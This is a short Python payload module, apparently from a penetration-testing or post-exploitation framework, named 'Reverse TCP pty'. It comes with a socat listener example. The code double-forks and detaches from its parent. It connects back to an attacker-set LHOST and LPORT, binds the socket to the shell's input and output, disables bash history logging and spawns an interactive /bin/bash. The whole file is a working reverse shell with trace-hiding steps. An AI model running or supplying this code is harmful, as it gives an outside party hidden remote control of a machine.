'''
NAME: Reverse TCP pty
DESCRIPTION: Opens pseudo-tty for terminal-like connections. Taken from python-pty-shells. Example listener: <tt>socat file:`tty`,echo=0,raw tcp4-listen:LPORT</tt>
VAR LHOST: host ip
VAR LPORT: host port
'''
import os, sys

try:
    # Use double fork + setsid/umask to mask parent process etc...
    if os.fork() == 0:
        if os.fork():
            # _exit exits without cleanup.
            os._exit(0)

        os.setsid()
        os.umask(0)

        import pty
        import socket

        LPORT = int(LPORT)

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((LHOST,LPORT))
        os.dup2(s.fileno(),0)
        os.dup2(s.fileno(),1)
        os.dup2(s.fileno(),2)
        os.putenv("HISTFILE",'/dev/null')
        pty.spawn('/bin/bash')
        s.close()
        os._exit(0)
    sys.stdout.write("[+] Fork successful, going dark.")
except OSError as e:
    sys.stderr.write("[!] {}".format(e))
